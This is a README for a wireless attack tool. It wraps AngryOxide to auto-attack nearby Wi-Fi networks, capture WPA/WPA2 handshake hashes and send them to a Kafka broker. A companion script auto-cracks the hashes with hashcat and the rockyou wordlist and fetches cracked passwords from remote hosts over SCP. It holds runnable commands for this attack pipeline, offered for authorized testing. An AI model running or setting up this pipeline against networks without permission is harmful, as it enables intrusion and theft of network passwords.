# AngryOxide 😡 AVClub Version

### A 802.11 Attack Tool

**This tool is for research purposes only. I am not responsible for anything you do or damage you cause. Only use against networks you have permission to test.**

### Features

- **Interactive or Auto Interface Selection**: Manually select or auto-select wireless interface from JSON config
- **Automatic Monitor Mode**: Enables monitor mode on the selected interface
- **AngryOxide Integration**: Runs AngryOxide as a background subprocess
- **Flexible Output Modes**: 
  - Save to local files in a `hashes` folder (default)
  - Publish to Kafka topic
  - Both local and Kafka simultaneously
- **Hash Exfiltration**: Automatically captures and exfiltrates WPA/WPA2 hashes
- **Whitelist Support**: Edit `whitelist.txt` to add BSSIDs to ignore
- **Configurable Intervals**: Set custom scan and attack intervals via command-line arguments
- **Kafka Integration**: Publishes hashes with metadata (SSID, BSSID, timestamp, system ID) to configurable Kafka brokers

### Usage

```bash
python3 AVC.py [OPTIONS]
```

The script will:
1. Select an interface (auto from JSON or interactive prompt)
2. Enable monitor mode on the selected interface
3. Create a `hashes` folder if using local output mode
4. Start AngryOxide in the background
5. Scan for `.hc22000` hash files every `<INTERVAL>` seconds
6. Extract SSID and BSSID from hash filenames
7. Save to local files and/or publish to Kafka (based on flags)
8. Press `Ctrl-C` to gracefully shut down

### Output Modes

- **Local Only** (default): Hashes saved to `hashes/` folder in project directory
- **Kafka Only**: Hashes published to Kafka broker, not saved locally
- **Local + Kafka**: Hashes saved locally AND published to Kafka simultaneously

### Command-Line Options

```
-b, --broker BROKER       Kafka broker address (ip:port), e.g., 192.168.1.100:9092
-i, --interval SECONDS    Scan interval in seconds (default: 5)
-a, --auto [CONFIG.JSON]  Auto-select interface from JSON config file (default: interfaces.json)
-lo, --local             Save hashes to local "hashes" folder (default if no -b)
-h, --help               Show help message
```

### Examples

```bash
# Interactive mode with default local output
python3 AVC.py

# Auto-select interface from default interfaces.json
python3 AVC.py -a

# Auto-select interface from custom config
python3 AVC.py -a myconfig.json

# Publish to Kafka
python3 AVC.py -b 192.168.1.100:9092

# Custom scan interval
python3 AVC.py -i 10

# Auto-select and publish to Kafka
python3 AVC.py -a -b 192.168.1.100:9092

# Local output only (explicit)
python3 AVC.py -lo

# Local output + Kafka publishing
python3 AVC.py -b 192.168.1.100:9092 -lo
```

### Interface Configuration

Edit `interfaces.json` to configure which interfaces to use with auto-select mode:

```json
{
  "interfaces": ["wlan0", "wlan1", "wlan2"]
}
```

Or use a simple array:

```json
["wlan0", "wlan1", "wlan2"]
```

The program will automatically select the first available interface from the list.

**Using custom config files:** You can create additional config files and specify them with `-a myconfig.json`. The program will use the format from `interfaces.json` for any custom config file.

### Kafka Output Format

Hashes are published to the `wifi-hash` topic with the following fields:
- `sysId`: System identifier
- `timestamp`: ISO format timestamp
- `essid`: Network SSID
- `bssid`: Access point MAC address
- `hash`: WPA/WPA2 hashline (Hashcat format)

### Quick Compatibility Check

**Linux**: Full support on all distributions with nl80211 drivers (Ubuntu 24.04 tested)

The overall goal of this tool is to provide a single-interface survey capability with advanced automated attacks that result in valid hashlines you can crack with [Hashcat](https://hashcat.net/hashcat/).

## Install Requirements

```bash
git clone https://github.com/avclub-chinchillas/AngryOxide-AVC
cd AngryOxide-AVC
chmod +x install.sh # Make executable
sudo ./install.sh # Full automated installation
```

The install script will automatically:
- Install system dependencies via apt:
  - Python 3 with venv support
  - sshpass (for remote SCP functionality)
  - Wireless tools (iw, iwconfig)
- Create a Python virtual environment (`avc-venv`)
- Skip already-installed dependencies (intelligent caching)
- Install the `angryoxide` binary to `/usr/bin/`
- Install shell completions (bash and zsh)
- Install Python dependencies from `requirements.txt` (pandas, kafka-python-ng) into the venv

No manual apt or pip commands needed!

### Running the Program

After installation, activate the virtual environment and run the program:

```bash
source avc-venv/bin/activate
python3 AVC.py [OPTIONS]
```

Or run it directly with the venv's Python:

```bash
./avc-venv/bin/python3 AVC.py [OPTIONS]
```

### Uninstalling

Use the dedicated uninstall script for a complete cleanup:

```bash
sudo ./uninstall.sh
```

This will remove:
- `angryoxide` binary from `/usr/bin/`
- Bash and Zsh shell completions
- Python virtual environment (`avc-venv`)
- Python cache files (`__pycache__`, `.pyc`, `.pyo`)
- Hashes folder and captured hash files
- `.egg-info` directories

To also remove config files and the entire project directory:

```bash
rm -rf /path/to/AngryOxide-AVC
```

**Alternative (deprecated):** You can also use `sudo ./install.sh uninstall`, but this only removes the binary and completions, not the venv and Python cache files.

## Additional Utilities

### AVC-CC.py (Hashcat Cracking Checker)

Monitor hashcat cracking progress locally or fetch results from remote hosts:

```bash
python3 AVC-CC.py -o <hashcat_outfile> [OPTIONS]
```

#### Local Monitoring

Monitor hashcat results on the local machine:

```bash
python3 AVC-CC.py -o results.txt
python3 AVC-CC.py -o results.txt -i 10 -n 5
```

#### Remote Monitoring

Fetch cracked passwords from remote hosts via SCP:

**Option 1: Direct remote address**
```bash
python3 AVC-CC.py -r 192.168.1.100:/path/to/results.txt user:password -o results.txt
```

**Option 2: JSON configuration file**
```bash
python3 AVC-CC.py -r hash-targets.json -o results.txt
```

#### Options

- `-o, --outfile` — Hashcat output file to monitor (required)
- `-i, --interval` — Check interval in minutes (default: 15)
- `-n, --notification-count` — Number of notifications before exit (default: 5)
- `-r, --remote` — Remote target(s) for SCP transfer:
  - Direct format: `-r IP:filepath username:password`
  - JSON format: `-r hash-targets.json` (no credentials needed)
- `-ac, --autocrack` — Auto-crack all .hc22000 files (optional: output filename, default: creds.txt)
- `-sc, --singlecrack` — Crack a single .hc22000 file (required: hashfile, optional: output file)

#### Auto-Cracking Feature

Enable automatic WPA2 password cracking with the `-ac/--autocrack` flag to crack all available hashes:

```bash
# Crack all .hc22000 files, save results to creds.txt (default)
python3 AVC-CC.py -o results.txt -ac

# Save cracked credentials to custom file
python3 AVC-CC.py -o results.txt -ac passwords.txt

# Combine with remote fetching and auto-cracking
python3 AVC-CC.py -r hash-targets.json -o results.txt -ac
```

#### Single File Cracking

Crack a specific `.hc22000` file with the `-sc/--singlecrack` flag:

```bash
# Crack single file, save to default creds.txt
python3 AVC-CC.py -sc network.hc22000

# Crack single file, save to custom output
python3 AVC-CC.py -sc network.hc22000 cracked.txt

# Combine with remote fetch and single crack
python3 AVC-CC.py -r hash-targets.json -o results.txt -sc network.hc22000 passwords.txt
```

#### Cracking Behavior

When auto-cracking (`-ac`) or single-cracking (`-sc`) is enabled, AVC-CC will:
1. Find or verify the `.hc22000` file(s)
2. Start hashcat subprocess(es) (mode 22000 for WPA2-PMK)
3. Monitor cracking progress in the background
4. Extract ESSID and cracked password when complete
5. Write results to credentials file in format: `ESSID:password`
6. Skip already-cracked files (checks for `cracked_*.txt` output)

**Output file format (creds.txt):**
```
NetworkName:MyPassword123
GuestNetwork:SecurePass456
Corporate:P@ssw0rd!
```

**Requirements for cracking:**
- `hashcat` must be installed
- Wordlist file (default: `/usr/share/wordlists/rockyou.txt`)
- Sufficient GPU/CPU resources for cracking

#### Remote Configuration (hash-targets.json)

Edit `hash-targets.json` to configure remote targets:

```json
[
  {
    "ip": "192.168.1.100",
    "filepath": "/path/to/hashcat/results.txt",
    "username": "user",
    "password": "password"
  },
  {
    "ip": "192.168.1.101",
    "filepath": "/path/to/hashcat/results.txt",
    "username": "user",
    "password": "password"
  }
]
```

**Requirements for remote functionality:**
- `sshpass` must be installed: `sudo apt-get install sshpass`
- SSH credentials must be valid
- Remote hosts must have SSH server running